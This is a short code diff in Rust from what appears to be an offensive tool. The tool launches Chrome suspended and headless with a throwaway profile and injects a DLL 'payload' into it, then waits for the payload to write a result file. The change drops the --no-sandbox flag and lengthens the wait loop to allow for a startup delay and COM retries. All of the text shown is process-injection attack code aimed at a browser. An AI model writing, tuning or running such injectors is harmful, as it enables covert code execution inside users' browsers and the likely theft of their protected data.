@@ -110,9 +110,8 @@ fn spawn_suspended_and_inject(chrome_exe: &str, dll_path: &str) -> Result<u32, S
     let profile_str = tmp_profile.to_string_lossy();
 
     // Headless + remote-debugging keeps Chrome alive while our payload runs.
-    // --no-sandbox strips additional mitigation policies Chrome sets on itself.
     let cmdline = format!(
-        "\"{}\" --headless=new --disable-gpu --no-sandbox \
+        "\"{}\" --headless=new --disable-gpu \
          --remote-debugging-port=0 --no-first-run \
          --no-default-browser-check --user-data-dir=\"{profile_str}\"",
         chrome_exe
@@ -316,9 +315,9 @@ fn main() {
         }
     }
 
-    // Wait for payload to write the result file.
+    // Wait for payload (4s startup delay + COM retries).
     print!("[*] Waiting for payload");
-    for _ in 0..30 {
+    for _ in 0..45 {
         print!(".");
         let _ = std::io::Write::flush(&mut std::io::stdout());
         thread::sleep(Duration::from_secs(1));
